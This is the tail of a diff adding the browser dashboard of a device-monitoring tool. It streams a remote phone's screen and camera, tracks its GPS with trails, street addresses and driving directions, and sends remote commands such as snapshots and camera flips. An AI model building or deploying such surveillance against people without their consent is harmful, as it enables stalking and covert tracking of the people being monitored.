+    setConn(isFileProto ? "SERVER OFFLINE (START SERVER)" : "RECONNECTING...","red");
+    clearInterval(pingInterval);
+    reconnectTimer=setTimeout(connectWS,1000);
+  };
+  ws.onerror=()=>{
+    setConn(isFileProto ? "SERVER OFFLINE (START SERVER)" : "ERROR","red");
+    reconnectTimer=setTimeout(connectWS,1000);
+  };
+}
+
+// Reconnect instantly when laptop tab becomes active or network resumes
+document.addEventListener('visibilitychange', ()=>{
+  if(!document.hidden){
+    if(!ws || ws.readyState !== 1 || (Date.now() - lastPongTime > 15000)){
+      connectWS();
+    }
+  }
+});
+window.addEventListener('online', connectWS);
+
+// Send remote command to a child — fires instantly
+function sendCmd(childId, cmd, payload){
+  const msg=JSON.stringify({type:"cmd",childId,cmd,payload:payload||{}});
+  if(ws&&ws.readyState===1){ ws.send(msg); }
+  else { setTimeout(()=>{ if(ws&&ws.readyState===1) ws.send(msg); },100); }
+}
+
+// ── Status poll every 10s ─────────────────────────────────────
+setInterval(async()=>{
+  try{
+    const r=await fetch(`${API_BASE}/status`);const d=await r.json();
+    if(d.children){
+      for(const c of d.children){ if(!devices[c.id]) addCard(c.id,c.label||"Device "+c.id); }
+      for(const id of Object.keys(devices)){ if(!d.children.find(c=>c.id===id)) removeCard(id); }
+      // Update heartbeat / location chips
+      for(const c of d.children){
+        updateMetaChip(c.id,'hb',`💓 ${Math.floor(c.uptimeSeconds/60)}m`);
+        if(c.lastLocation) updateMetaChip(c.id,'loc',`📍 ${c.lastLocation.lat.toFixed(4)},${c.lastLocation.lng.toFixed(4)}`,true);
+      }
+    }
+  }catch(e){}
+},2000);
+
+// ── FPS counter ───────────────────────────────────────────────
+setInterval(()=>{
+  for(const id of Object.keys(devices)){
+    const dev=devices[id];
+    ['screen','camera'].forEach(feed=>{
+      const cnt=dev[feed+'Frames']||0;
+      dev[feed+'Fps']=cnt;dev[feed+'Frames']=0;
+      const el=document.getElementById(`fps-${feed}-${id}`);
+      if(el){el.style.display=cnt>0?'block':'none';el.textContent=cnt+' FPS';}
+    });
+  }
+},1000);
+
+// ── Device cards ──────────────────────────────────────────────
+function addCard(id,label){
+  if(document.getElementById('card-'+id)) return;
+  devices[id]={label,screenFrame:null,cameraFrame:null,screenFrames:0,cameraFrames:0};
+  const wrap=document.getElementById('cards');
+  const div=document.createElement('div');
+  div.className='device-card';div.id='card-'+id;
+  div.innerHTML=`
+    <div class="device-header">
+      <div class="dname">📱 ${label}</div>
+      <div class="dbadges">
+        <span class="badge badge-off" id="sbadge-${id}">📺 SCREEN</span>
+        <span class="badge badge-off" id="cbadge-${id}">📷 CAMERA</span>
+        <span class="badge badge-off" id="mbadge-${id}">🎯 MOTION</span>
+        <span class="badge badge-off" id="obadge-${id}" style="display:none">📵 OFFLINE</span>
+      </div>
+      <div class="dcontrols">
+        <select class="btn-sm" onchange="sendCmd('${id}','set-sensitivity',{level:this.value})" title="Detection Sensitivity">
+          <option value="ultra">⚡ ULTRA SENSITIVE</option>
+          <option value="high">🎯 HIGH SENSITIVE</option>
+          <option value="normal">⚖️ NORMAL</option>
+        </select>
+        <button class="btn-sm" onclick="instantSaveLive('${id}','screen')" title="Save live screen frame to laptop">💾 SCREEN</button>
+        <button class="btn-sm" onclick="instantSaveLive('${id}','camera')" title="Save live camera frame to laptop">💾 CAM</button>
+        <button class="btn-sm" onclick="sendCmd('${id}','take-snapshot')" title="Force high-res snapshot on server">📸 SNAP</button>
+        <button class="btn-sm" onclick="sendCmd('${id}','flip-camera')" title="Flip front/rear camera">🔄 FLIP</button>
+        <button class="btn-sm" onclick="sendCmd('${id}','get-location')" title="Request GPS fix now">📍 GPS</button>
+        <button class="btn-sm warn" onclick="sendCmd('${id}','restart-streams')" title="Restart streams">↺ RESTART</button>
+        <button class="btn-sm danger" onclick="disconnectChild('${id}')">⏹ STOP</button>
+      </div>
+    </div>
+    <div class="device-meta" id="meta-${id}">
+      <div class="meta-chip" id="meta-hb-${id}">💓 --</div>
+      <div class="meta-chip" id="meta-loc-${id}">📍 NO FIX</div>
+      <div class="meta-chip" id="meta-motion-${id}">🎯 WATCHING</div>
+    </div>
+    <div class="feeds">
+      <div class="feed" id="sfeed-${id}">
+        <div class="feed-label">📺 SCREEN</div>
+        <div class="feed-status fst-off" id="sst-${id}">WAITING</div>
+        <div class="feed-activity" id="sact-${id}"></div>
+        <div class="feed-scanline" id="sscl-${id}"></div>
+        <div class="feed-rec" id="srec-${id}"><div class="rec-dot"></div>REC</div>
+        <div class="feed-clock" id="sclk-${id}"></div>
+        <div class="feed-camid" id="scid-${id}">CAM1 // SCREEN</div>
+        <div class="feed-ph" id="sph-${id}"><div class="icon">🖥️</div><p>WAITING FOR SCREEN...</p></div>
+        <img class="feed-img" id="simg-${id}" alt="screen" onclick="openFS('${id}','screen')"/>
+        <div class="feed-fps" id="fps-screen-${id}"></div>
+        <div class="feed-time" id="stime-${id}"></div>
+        <div class="activity-label" id="sactlbl-${id}">ACTIVITY</div>
+        <div class="activity-bar"><div class="activity-bar-fill" id="sbar-${id}"></div></div>
+      </div>
+      <div class="feed" id="cfeed-${id}">
+        <div class="feed-label">📷 CAMERA</div>
+        <div class="feed-status fst-off" id="cst-${id}">WAITING</div>
+        <div class="feed-scanline" id="cscl-${id}"></div>
+        <div class="feed-rec" id="crec-${id}"><div class="rec-dot"></div>REC</div>
+        <div class="feed-clock" id="cclk-${id}"></div>
+        <div class="feed-camid" id="ccid-${id}">CAM2 // CAMERA</div>
+        <div class="feed-ph" id="cph-${id}"><div class="icon">📷</div><p>WAITING FOR CAMERA...</p></div>
+        <img class="feed-img" id="cimg-${id}" alt="camera" onclick="openFS('${id}','camera')"/>
+        <div class="feed-fps" id="fps-camera-${id}"></div>
+        <div class="feed-time" id="ctime-${id}"></div>
+      </div>
+    </div>`;
+  wrap.appendChild(div);
+  updateEmpty();
+  toast(`📱 ${label} connected`, 'connect');
+}
+
+function removeCard(id){
+  const el=document.getElementById('card-'+id);if(el) el.remove();
+  delete devices[id];
+  if(fsId===id) closeFS();
+  updateEmpty();
+  toast(`📵 Device ${id} disconnected`, 'offline');
+}
+
+function markOffline(id, age){
+  const card=document.getElementById('card-'+id);
+  const ob=document.getElementById('obadge-'+id);
+  if(card) card.classList.add('offline');
+  if(ob){ob.style.display='';ob.textContent=`📵 OFFLINE ${age}s`;ob.className='badge badge-offline';}
+}
+
+function updateEmpty(){
+  const n=Object.keys(devices).length;
+  document.getElementById('empty').style.display=n?'none':'block';
+  document.getElementById('cards').style.display=n?'block':'none';
+  document.getElementById('devCount').textContent=`${n} DEVICE${n!==1?'S':''}`;
+}
+
+function updateMetaChip(id, key, text, on){
+  const el=document.getElementById(`meta-${key}-${id}`);
+  if(el){el.textContent=text;el.className='meta-chip'+(on?' on':'');}
+}
+
+// ── Feed updates ──────────────────────────────────────────────
+function updateFeed(id,feed,dataUrl){
+  if(!devices[id]) return;
+  const dev=devices[id];dev[feed+'Frame']=dataUrl;dev[feed+'Frames']=(dev[feed+'Frames']||0)+1;
+  const prefix=feed==='screen'?'s':'c';
+  const img=document.getElementById(`${prefix}img-${id}`);
+  const ph=document.getElementById(`${prefix}ph-${id}`);
+  const st=document.getElementById(`${prefix}st-${id}`);
+  const badge=document.getElementById(`${feed==='screen'?'s':'c'}badge-${id}`);
+  const time=document.getElementById(`${prefix}time-${id}`);
+  const card=document.getElementById('card-'+id);
+  if(img){img.src=dataUrl;img.style.display='block';}
+  if(ph) ph.style.display='none';
+  if(st){st.textContent='LIVE';st.className='feed-status fst-live';}
+  if(badge){badge.textContent=(feed==='screen'?'📺 SCREEN':'📷 CAMERA')+' LIVE';badge.className='badge badge-live';}
+  if(time){time.style.display='block';time.textContent=new Date().toLocaleTimeString();}
+  if(card){card.classList.add('anylive');card.classList.remove('offline');}
+  const ob=document.getElementById('obadge-'+id);if(ob) ob.style.display='none';
+  if(fsId===id&&fsFeed===feed) document.getElementById('fsImg').src=dataUrl;
+  // CCTV overlays
+  const scl=document.getElementById((feed==='screen'?'s':'c')+'scl-'+id);
+  const rec=document.getElementById((feed==='screen'?'s':'c')+'rec-'+id);
+  const clk=document.getElementById((feed==='screen'?'s':'c')+'clk-'+id);
+  const cid=document.getElementById((feed==='screen'?'s':'c')+'cid-'+id);
+  if(scl) scl.classList.add('on');
+  if(rec) rec.classList.add('on');
+  if(clk) clk.classList.add('on');
+  if(cid) cid.classList.add('on');
+  // Screen activity analysis
+  if(feed==='screen') measureScreenActivity(id, dataUrl);
+}
+
+function stopFeed(id,feed){
+  const prefix=feed==='screen'?'s':'c';
+  const st=document.getElementById(`${prefix}st-${id}`);
+  const badge=document.getElementById(`${feed==='screen'?'s':'c'}badge-${id}`);
+  if(st){st.textContent='STOPPED';st.className='feed-status fst-off';}
+  if(badge){badge.textContent=(feed==='screen'?'📺 SCREEN':'📷 CAMERA')+' OFF';badge.className='badge badge-off';}
+  const dev=devices[id];if(dev) dev[feed+'Frame']=null;
+  const bothStopped=!dev?.screenFrame&&!dev?.cameraFrame;
+  const card=document.getElementById('card-'+id);
+  if(bothStopped&&card) card.classList.remove('anylive');
+  // CCTV overlays off
+  const scl=document.getElementById(prefix+'scl-'+id);
+  const rec=document.getElementById(prefix+'rec-'+id);
+  const clk=document.getElementById(prefix+'clk-'+id);
+  const cid=document.getElementById(prefix+'cid-'+id);
+  if(scl) scl.classList.remove('on');
+  if(rec) rec.classList.remove('on');
+  if(clk) clk.classList.remove('on');
+  if(cid) cid.classList.remove('on');
+}
+
+// ── Location handling ─────────────────────────────────────────
+const mapTrails={};       // id -> L.polyline
+const trailPoints={};     // id -> [[lat,lng],...]
+const deviceLocData={};   // id -> latest location data
+const addressCache={};    // "lat,lng" -> address string
+let showTrails=true;
+
+function initMap(){
+  if(leafletMap) return;
+  leafletMap=L.map('map').setView([0,20],2);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{
+    attribution:'&copy; OpenStreetMap &copy; CARTO',maxZoom:19
+  }).addTo(leafletMap);
+}
+
+function toggleTrails(){
+  showTrails=document.getElementById('chkTrail').checked;
+  for(const id of Object.keys(mapTrails)){
+    if(showTrails) mapTrails[id].addTo(leafletMap);
+    else leafletMap.removeLayer(mapTrails[id]);
+  }
+}
+
+function clearTrails(){
+  for(const id of Object.keys(mapTrails)) leafletMap.removeLayer(mapTrails[id]);
+  for(const id of Object.keys(trailPoints)) trailPoints[id]=[];
+  for(const id of Object.keys(mapTrails)) delete mapTrails[id];
+}
+
+function centerAllDevices(){
+  const pts=Object.values(deviceLocData).map(d=>[d.coords.lat,d.coords.lng]);
+  if(pts.length===1) leafletMap.setView(pts[0],15);
+  else if(pts.length>1) leafletMap.fitBounds(L.latLngBounds(pts).pad(0.2));
+}
+
+// Reverse geocode using OpenStreetMap Nominatim (free, no key needed)
+async function reverseGeocode(lat,lng){
+  const key=`${lat.toFixed(4)},${lng.toFixed(4)}`;
+  if(addressCache[key]) return addressCache[key];
+  try{
+    const r=await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
+      {headers:{'Accept-Language':'en'}});
+    const d=await r.json();
+    const addr=d.display_name||'Unknown location';
+    // shorten — keep first 2 parts
+    const short=addr.split(',').slice(0,3).join(',').trim();
+    addressCache[key]=short;
+    return short;
+  }catch(e){ return 'Address unavailable'; }
+}
+
+async function handleLocation(msg){
+  const {from:id, label, coords, ts} = msg;
+  if(!coords) return;
+
+  deviceLocData[id]={label,coords,ts};
+
+  // Update meta chip on feeds tab
+  updateMetaChip(id,'loc',`📍 ${coords.lat.toFixed(4)},${coords.lng.toFixed(4)}`,true);
+  document.getElementById('mapLastUpdate').textContent='Last fix: '+new Date(ts).toLocaleTimeString();
+
+  // Log entry
+  locationHistory.unshift({id,label,coords,ts});
+  if(locationHistory.length>500) locationHistory.pop();
+  renderLocationLog();
+
+  // ── Map marker + trail ────────────────────────────────────────
+  if(leafletMap){
+    // Trail
+    if(!trailPoints[id]) trailPoints[id]=[];
+    trailPoints[id].push([coords.lat,coords.lng]);
+    if(trailPoints[id].length>200) trailPoints[id].shift();
+
+    if(mapTrails[id]) mapTrails[id].setLatLngs(trailPoints[id]);
+    else {
+      mapTrails[id]=L.polyline(trailPoints[id],{color:'#00f5ff',weight:2,opacity:0.5,dashArray:'4,4'});
+      if(showTrails) mapTrails[id].addTo(leafletMap);
+    }
+
+    // Marker
+    const iconHtml=`
+      <div style="position:relative;">
+        <div style="background:#00ff88;width:14px;height:14px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 12px #00ff88;"></div>
+        <div style="position:absolute;top:-22px;left:50%;transform:translateX(-50%);white-space:nowrap;font-family:monospace;font-size:10px;background:rgba(0,0,0,0.8);color:#00ff88;padding:2px 5px;border-radius:2px;border:1px solid rgba(0,255,136,0.3);">${label}</div>
+      </div>`;
+    const icon=L.divIcon({className:'',html:iconHtml,iconSize:[14,14],iconAnchor:[7,7]});
+
+    if(mapMarkers[id]){
+      mapMarkers[id].setLatLng([coords.lat,coords.lng]);
+      mapMarkers[id].setPopupContent(buildPopup(label,coords,ts,'loading…'));
+    } else {
+      mapMarkers[id]=L.marker([coords.lat,coords.lng],{icon})
+        .addTo(leafletMap)
+        .bindPopup(buildPopup(label,coords,ts,'loading…'));
+      if(document.getElementById('chkFollow').checked)
+        leafletMap.setView([coords.lat,coords.lng],15);
+    }
+    if(document.getElementById('chkFollow').checked && Object.keys(mapMarkers).length===1)
+      leafletMap.setView([coords.lat,coords.lng],15);
+  }
+
+  // Accuracy circle
+  if(!window._accCircles) window._accCircles={};
+  if(window._accCircles[id]) leafletMap.removeLayer(window._accCircles[id]);
+  window._accCircles[id]=L.circle([coords.lat,coords.lng],{
+    radius:coords.acc,color:'#00f5ff',fillColor:'#00f5ff',fillOpacity:0.05,weight:1,dashArray:'4,4'
+  }).addTo(leafletMap);
+
+  // Device location card
+  updateDeviceLocCard(id,label,coords,ts);
+
+  // Reverse geocode and update popup + card
+  reverseGeocode(coords.lat,coords.lng).then(addr=>{
+    if(mapMarkers[id]) mapMarkers[id].setPopupContent(buildPopup(label,coords,ts,addr));
+    updateDeviceLocCard(id,label,coords,ts,addr);
+  });
+}
+
+function buildPopup(label,coords,ts,address){
+  const gmUrl=`https://www.google.com/maps?q=${coords.lat},${coords.lng}`;
+  const wazeUrl=`https://waze.com/ul?ll=${coords.lat},${coords.lng}&navigate=yes`;
+  const omUrl=`https://www.openstreetmap.org/?mlat=${coords.lat}&mlon=${coords.lng}#map=16/${coords.lat}/${coords.lng}`;
+  const gmDirUrl=`https://www.google.com/maps/dir/?api=1&destination=${coords.lat},${coords.lng}`;
+  return `<div style="font-family:monospace;font-size:12px;line-height:1.8;min-width:200px;">
+    <b style="font-size:13px;">📱 ${label}</b><br>
+    <span style="color:#888;">📍</span> ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}<br>
+    <span style="color:#888;">🎯</span> Accuracy: ±${coords.acc}m<br>
+    ${coords.alt!=null?`<span style="color:#888;">⛰</span> Altitude: ${coords.alt}m<br>`:''}
+    ${coords.speed!=null?`<span style="color:#888;">🚗</span> Speed: ${coords.speed} km/h<br>`:''}
+    <span style="color:#888;">🕐</span> ${new Date(ts).toLocaleTimeString()}<br>
+    <span style="color:#888;font-size:11px;">📫 ${address||'Fetching address…'}</span><br>
+    <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;">
+      <a href="${gmUrl}" target="_blank" style="color:#4285f4;text-decoration:none;border:1px solid #4285f4;padding:2px 7px;border-radius:2px;font-size:11px;">🗺 Google Maps</a>
+      <a href="${wazeUrl}" target="_blank" style="color:#00d2ff;text-decoration:none;border:1px solid #00d2ff;padding:2px 7px;border-radius:2px;font-size:11px;">🚗 Waze</a>
+      <a href="${gmDirUrl}" target="_blank" style="color:#00ff88;text-decoration:none;border:1px solid #00ff88;padding:2px 7px;border-radius:2px;font-size:11px;">➡ Directions</a>
+    </div>
+  </div>`;
+}
+
+function updateDeviceLocCard(id,label,coords,ts,address){
+  const container=document.getElementById('deviceLocCards');
+  let card=document.getElementById('loccard-'+id);
+  if(!card){
+    card=document.createElement('div');
+    card.className='loc-card';
+    card.id='loccard-'+id;
+    container.appendChild(card);
+  }
+
+  const age=Math.floor((Date.now()-ts)/1000);
+  const gmUrl=`https://www.google.com/maps?q=${coords.lat},${coords.lng}`;
+  const gmDirUrl=`https://www.google.com/maps/dir/?api=1&destination=${coords.lat},${coords.lng}`;
+  const wazeUrl=`https://waze.com/ul?ll=${coords.lat},${coords.lng}&navigate=yes`;
+  const omUrl=`https://www.openstreetmap.org/?mlat=${coords.lat}&mlon=${coords.lng}#map=16/${coords.lat}/${coords.lng}`;
+  const shareUrl=`https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+
+  card.className='loc-card fresh';
+  card.innerHTML=`
+    <div class="loc-age" id="locage-${id}">${age<60?age+'s ago':Math.floor(age/60)+'m ago'}</div>
+    <div class="loc-card-name">📱 ${label}</div>
+    <div class="loc-card-coords">${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}</div>
+    <div class="loc-card-meta">
+      <span class="on">🎯 ±${coords.acc}m</span>
+      ${coords.alt!=null?`<span class="on">⛰ ${coords.alt}m</span>`:''}
+      ${coords.speed!=null?`<span class="on">🚗 ${coords.speed} km/h</span>`:''}
+      <span>🕐 ${new Date(ts).toLocaleTimeString()}</span>
+    </div>
+    <div class="loc-card-address" id="locaddr-${id}">${address||'📫 Fetching address…'}</div>
+    <div class="loc-card-btns">
+      <a class="loc-btn gmap" href="${gmUrl}" target="_blank">🗺 Google Maps</a>
+      <a class="loc-btn waze" href="${wazeUrl}" target="_blank">🚗 Waze</a>
+      <a class="loc-btn omap" href="${omUrl}" target="_blank">🌍 OSM</a>
+      <a class="loc-btn" href="${gmDirUrl}" target="_blank">➡ Directions</a>
+      <button class="loc-btn" onclick="navigator.clipboard.writeText('${coords.lat},${coords.lng}').then(()=>toast('Coordinates copied!','info',2000))">📋 Copy</button>
+      <button class="loc-btn" onclick="if(leafletMap){leafletMap.setView([${coords.lat},${coords.lng}],17);switchTab('map');}">🔍 Zoom</button>
+    </div>`;
+
+  // Age ticker
+  let ageStart=Math.floor((Date.now()-ts)/1000);
+  if(card._ageTick) clearInterval(card._ageTick);
+  card._ageTick=setInterval(()=>{
+    ageStart++;
+    const el=document.getElementById('locage-'+id);
+    if(el) el.textContent=ageStart<60?ageStart+'s ago':Math.floor(ageStart/60)+'m ago';
+    else clearInterval(card._ageTick);
+  },1000);
+}
+
+function renderLocationLog(){
+  const el=document.getElementById('locationLog');
+  const header='<div style="font-family:Share Tech Mono,monospace;font-size:0.62rem;color:var(--cyan-dim);margin-bottom:6px;letter-spacing:0.08em;">// LOCATION HISTORY</div>';
+  el.innerHTML=header+locationHistory.slice(0,50).map(e=>{
+    const gmUrl=`https://www.google.com/maps?q=${e.coords.lat},${e.coords.lng}`;
+    return `<div class="loc-entry">
+      <span class="ts">${new Date(e.ts).toLocaleTimeString()}</span>
+      <span class="lbl">${e.label}</span>
+      <span>${e.coords.lat.toFixed(5)}, ${e.coords.lng.toFixed(5)} ±${e.coords.acc}m${e.coords.speed!=null?' · '+e.coords.speed+'km/h':''}</span>
+      <a href="${gmUrl}" target="_blank">🗺</a>
+    </div>`;
+  }).join('');
+}
+
+// ── Motion alerts ─────────────────────────────────────────────
+function handleMotion(msg){
+  const {from:id, label, feed} = msg;
+  const card=document.getElementById('card-'+id);
+  const mb=document.getElementById('mbadge-'+id);
+  playMotionChime();
+  if(card){ card.classList.add('motion'); setTimeout(()=>card.classList.remove('motion'),8000); }
+  if(mb){ mb.textContent='🎯 MOTION!'; mb.className='badge badge-motion'; setTimeout(()=>{mb.textContent='🎯 MOTION';mb.className='badge badge-off';},8000); }
+  toast(`🎯 Motion detected on ${label||id} [${(feed||'camera').toUpperCase()}]`, 'motion', 6000);
+  addAlert();
+  updateMetaChip(id,'motion','🎯 '+new Date().toLocaleTimeString(),true);
+}
+
+// ── Session log ───────────────────────────────────────────────
+function renderLog(events){
+  const el=document.getElementById('logContainer');
+  if(!events||!events.length){ el.innerHTML='<div style="font-family:Share Tech Mono,monospace;font-size:0.7rem;color:var(--text-dim);padding:20px 0;">No events yet.</div>'; return; }
+  el.innerHTML=[...events].reverse().map(e=>{
+    const typeClass=e.type.includes('connect')?'connect':e.type.includes('disconnect')?'disconnect':e.type==='location'?'location':e.type==='motion'?'motion':'snapshot';
+    const body=e.type==='location'&&e.coords?`${e.coords.lat.toFixed(5)}, ${e.coords.lng.toFixed(5)} ±${e.coords.acc}m`:
+                e.type==='snapshot'?`${e.feedType} — ${e.file||''}`:
+                e.label||e.childId||'';
+    return `<div class="log-entry"><span class="log-ts">${new Date(e.ts).toLocaleTimeString()}</span><span class="log-type ${typeClass}">${e.type.toUpperCase()}</span><span class="log-body">${body}</span></div>`;
+  }).join('');
+}
+
+async function loadLog(){
+  try{const r=await fetch(`${API_BASE}/logs`);const d=await r.json();renderLog(d);}catch(e){}
+}
+
+// ── Snapshots ─────────────────────────────────────────────────
+async function loadSnapshots(){
+  try{
+    const r=await fetch(`${API_BASE}/snapshots`);const files=await r.json();
+    const grid=document.getElementById('snapsGrid');
+    if(!files.length){grid.innerHTML='<p style="font-family:Share Tech Mono,monospace;font-size:0.7rem;color:var(--text-dim);">No snapshots yet — they appear once streams start.</p>';return;}
+    grid.innerHTML=files.map(f=>{
+      const parts=f.replace('.jpg','').split('_');
+      const ts=parts[0]?parts[0].replace(/T/,' ').slice(0,16):'';
+      const feed=parts[parts.length-1]||'';
+      return `<div class="snap-item" onclick="openFSUrl('${API_BASE}/snapshots/${f}','${f}')">
+        <img src="${API_BASE}/snapshots/${f}" loading="lazy" alt="${f}"/>
+        <div class="snap-meta">${ts} ${feed.toUpperCase()}</div>
+      </div>`;
+    }).join('');
+  }catch(e){}
+}
+
+// ── Fullscreen ────────────────────────────────────────────────
+function openFS(id,feed){
+  const dev=devices[id];if(!dev) return;
+  const frame=feed==='screen'?dev.screenFrame:dev.cameraFrame;if(!frame) return;
+  fsId=id;fsFeed=feed;
+  document.getElementById('fsInfo').textContent=dev.label;
+  document.getElementById('fsFeed').textContent=feed==='screen'?'📺 SCREEN FEED':'📷 CAMERA FEED';
+  document.getElementById('fsImg').src=frame;
+  document.getElementById('fsOverlay').classList.add('show');
+}
+function openFSUrl(url,name){
+  fsId=null;fsFeed=null;
+  document.getElementById('fsInfo').textContent=name;
+  document.getElementById('fsFeed').textContent='📸 SNAPSHOT';
+  document.getElementById('fsImg').src=url;
+  document.getElementById('fsOverlay').classList.add('show');
+}
+function closeFS(){fsId=null;fsFeed=null;document.getElementById('fsOverlay').classList.remove('show');}
+document.addEventListener('keydown',e=>{if(e.key==='Escape') closeFS();});
+
+function disconnectChild(id){
+  if(ws&&ws.readyState===1) ws.send(JSON.stringify({type:"disconnect-child",childId:id}));
+}
+
+// ── CCTV live clock tick — updates timestamp on all active feeds every second ──
+setInterval(()=>{
+  const now = new Date();
+  const ts = now.toLocaleDateString('en-GB',{day:'2-digit',month:'2-digit',year:'2-digit'})
+           + ' ' + now.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  for(const id of Object.keys(devices)){
+    ['s','c'].forEach(p=>{
+      const clk=document.getElementById(p+'clk-'+id);
+      if(clk&&clk.classList.contains('on')) clk.textContent=ts;
+    });
+  }
+},1000);
+
+// ── Screen Activity Change Detector ──────────────────────────
+// Compares successive JPEG frames by decoding into an offscreen canvas
+// and measuring pixel-level differences to produce an activity score.
+const _actCanvas = document.createElement('canvas');
+const _actCtx = _actCanvas.getContext('2d',{willReadFrequently:true});
+const _actPrev = {};   // id -> ImageData
+const _actScore = {};  // id -> smoothed 0-1
+
+function measureScreenActivity(id, dataUrl){
+  const img = new Image();
+  img.onload = () => {
+    const W = 128, H = 72; // small for speed
+    _actCanvas.width = W; _actCanvas.height = H;
+    _actCtx.drawImage(img, 0, 0, W, H);
+    const curr = _actCtx.getImageData(0, 0, W, H).data;
+    const prev = _actPrev[id];
+    if(!prev || prev.length !== curr.length){
+      _actPrev[id] = new Uint8ClampedArray(curr);
+      return;
+    }
+    let diff = 0;
+    for(let i = 0; i < curr.length; i += 4){
+      const dr = Math.abs(curr[i]   - prev[i]);
+      const dg = Math.abs(curr[i+1] - prev[i+1]);
+      const db = Math.abs(curr[i+2] - prev[i+2]);
+      if((dr + dg + db) / 3 > 12) diff++;
+    }
+    _actPrev[id] = new Uint8ClampedArray(curr);
+    const raw = diff / (W * H);            // 0 – 1
+    const prev_score = _actScore[id] || 0;
+    const score = prev_score * 0.4 + raw * 0.6; // EMA smoothing
+    _actScore[id] = score;
+    applyActivityUI(id, score);
+  };
+  img.src = dataUrl;
+}
+
+function applyActivityUI(id, score){
+  const bar   = document.getElementById('sbar-' + id);
+  const over  = document.getElementById('sact-' + id);
+  const label = document.getElementById('sactlbl-' + id);
+  if(!bar || !over) return;
+
+  const pct = Math.min(100, Math.round(score * 400)); // amplify 0-25% range → 0-100%
+
+  // Activity bar width + color
+  bar.style.width = pct + '%';
+  if(pct > 60)      bar.style.background = 'linear-gradient(90deg,#ff3366,#ff8800)';
+  else if(pct > 30) bar.style.background = 'linear-gradient(90deg,#ffcc00,#00f5ff)';
+  else              bar.style.background = 'linear-gradient(90deg,#00ff88,#00f5ff)';
+
+  // Flash overlay on high activity bursts
+  if(pct > 25){
+    over.classList.add('flash');
+    if(label) { label.style.display = 'block'; label.textContent = pct + '% ACTIVITY'; }
+    clearTimeout(over._flashTimer);
+    over._flashTimer = setTimeout(()=>{ over.classList.remove('flash'); }, 250);
+  } else if(pct < 5){
+    if(label) label.style.display = 'none';
+  }
+}
+
+connectWS();
+updateEmpty();
+</script>
+</body>
+</html>
